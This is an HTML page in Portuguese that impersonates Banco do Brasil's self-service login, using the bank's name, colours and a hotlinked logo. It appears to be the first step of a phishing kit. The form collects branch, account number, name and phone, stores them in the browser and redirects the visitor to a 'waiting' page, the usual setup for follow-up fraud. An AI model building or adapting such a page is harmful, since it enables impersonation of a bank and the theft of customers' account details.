<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto atendimento BB</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FFD700;
        }
        .header {
            background-color: #FFD700;
            padding: 20px;
            text-align: center;
        }
        .header img {
            width: 65px;
            height: 65px;
            float: left;
            border-radius: 55%;
        }
        .header h1 {
            color: #0047FF;
            font-size: 24px;
            margin: 0;
            font-weight: bold;
        }
        .login-container {
            background-color: #FFD700;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 50px auto;
            text-align: center;
        }
        .input-field {
            display: block;
            width: calc(100% - 30px);
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 10px;
            font-size: 16px;
            text-align: center;
        }
        .btn {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        function handleSubmit(event) {
            event.preventDefault();
            const agencia = document.getElementById('agencia').value;
            const conta = document.getElementById('conta').value;
            const nome = document.getElementById('nome').value;
            const telefone = document.getElementById('telefone').value;

            if (agencia && conta && nome && telefone) {
                const formData = {
                    agencia: agencia,
                    conta: conta,
                    nome: nome,
                    telefone: telefone
                };
                localStorage.setItem('formData', JSON.stringify(formData));
                window.location.href = 'espera.html';
            } else {
                alert('Preencha todos os campos!');
            }
        }
    </script>
</head>
<body>
    <div class="header">
        <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="Banco do Brasil" class="logo">
        <h1>Auto atendimento BB</h1>
    </div>

    <div class="login-container">
        <h2>Identifique-se</h2>
        <form onsubmit="handleSubmit(event)">
            <input type="text" id="agencia" class="input-field" placeholder="AgÃªncia" required>
            <input type="text" id="conta" class="input-field" placeholder="Conta" required>
            <input type="text" id="nome" class="input-field" placeholder="Nome" required>
            <input type="text" id="telefone" class="input-field" placeholder="Telefone" required>
            <button type="submit" class="btn">CONTINUAR</button>
        </form>
    </div>
</body>
</html>
